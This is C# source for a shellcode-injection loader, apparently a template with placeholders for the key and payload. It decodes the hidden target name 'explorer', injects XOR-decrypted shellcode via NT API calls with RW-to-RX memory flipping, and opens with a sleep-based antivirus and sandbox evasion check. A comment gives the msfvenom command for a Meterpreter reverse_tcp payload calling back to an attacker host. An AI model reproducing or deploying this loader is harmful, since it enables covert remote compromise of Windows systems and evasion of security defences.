using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace WorkerService
{
    internal class Program
    {
        private static readonly uint PAGE_READWRITE = 0x04;
        private static readonly uint PAGE_EXECUTE_READ = 0x20;
        private static readonly uint MEM_COMMIT = 0x1000;
        private static readonly uint MEM_RESERVE = 0x2000;

        // randomized per build
        public const byte XorKey = {xor_key};

        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        public struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtOpenProcess(
            ref IntPtr ProcessHandle,
            UInt32 AccessMask,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            ref CLIENT_ID clientId);

        [DllImport("ntdll.dll")]
        static extern uint NtAllocateVirtualMemory(
            IntPtr processHandle,
            ref IntPtr baseAddress,
            IntPtr zeroBits,
            ref IntPtr regionSize,
            uint allocationType,
            uint protect);

        [DllImport("ntdll.dll")]
        static extern uint NtWriteVirtualMemory(
            IntPtr processHandle,
            IntPtr baseAddress,
            byte[] buffer,
            uint bufferSize,
            out uint written);

        [DllImport("ntdll.dll")]
        static extern uint NtProtectVirtualMemory(
            IntPtr processHandle,
            ref IntPtr baseAddress,
            ref IntPtr regionSize,
            uint newProtect,
            out uint oldProtect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtCreateThreadEx(
            out IntPtr hThread,
            uint DesiredAccess,
            IntPtr ObjectAttributes,
            IntPtr ProcessHandle,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            [MarshalAs(UnmanagedType.Bool)] bool CreateSuspended,
            uint StackZeroBits,
            uint SizeOfStackCommit,
            uint SizeOfStackReserve,
            IntPtr lpBytesBuffer);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static void Main(string[] args)
        {
            // AV evasion: Sleep for 10s and detect if time really passed
            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                return;
            }
            // XOR-encrypted shellcode (pre-encrypted offline with XorKey = 0xfa)
            // Generate raw shellcode:
            //   msfvenom -p windows/x64/meterpreter/reverse_tcp exitfunc=thread LHOST=<IP> LPORT=443 -f raw > sc.bin
            // Then XOR each byte with 0xfa before embedding here
            {encrypted_shellcode}
            // 1. Resolve target process name at runtime (XOR-obfuscated)
            byte[] tn = new byte[] { 0x27, 0x3A, 0x32, 0x2E, 0x2D, 0x30, 0x27, 0x30 };
            for (int q = 0; q < tn.Length; q++) tn[q] ^= 0x42;
            string targetName = System.Text.Encoding.ASCII.GetString(tn);

            // Open target process via NT API
            Process[] targetProcess = Process.GetProcessesByName(targetName);
            IntPtr hProcess = IntPtr.Zero;
            CLIENT_ID clientId = new CLIENT_ID
            {
                UniqueProcess = new IntPtr(targetProcess[0].Id),
                UniqueThread = IntPtr.Zero
            };
            OBJECT_ATTRIBUTES objectAttributes = new OBJECT_ATTRIBUTES();
            NtOpenProcess(ref hProcess, 0x001F0FFF, ref objectAttributes, ref clientId);

            // 2. Allocate RW (not RWX) space in target process
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)buf.Length;
            NtAllocateVirtualMemory(hProcess, ref baseAddress, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            // 3. Decrypt shellcode locally before writing to remote process
            int i = 0;
            while (i < buf.Length)
            {
                buf[i] = (byte)(buf[i] ^ XorKey);
                i++;
            }

            // 4. Write decrypted shellcode to target process
            NtWriteVirtualMemory(hProcess, baseAddress, buf, (uint)buf.Length, out uint bytesWritten);

            // 5. Flip memory protection: RW → RX (W^X — never expose RWX)
            uint oldProtect;
            NtProtectVirtualMemory(hProcess, ref baseAddress, ref regionSize, PAGE_EXECUTE_READ, out oldProtect);

            // 6. Create remote thread at shellcode address
            IntPtr hRemoteThread;
            NtCreateThreadEx(out hRemoteThread, 0x1FFFFF, IntPtr.Zero, hProcess, baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
        }
    }
}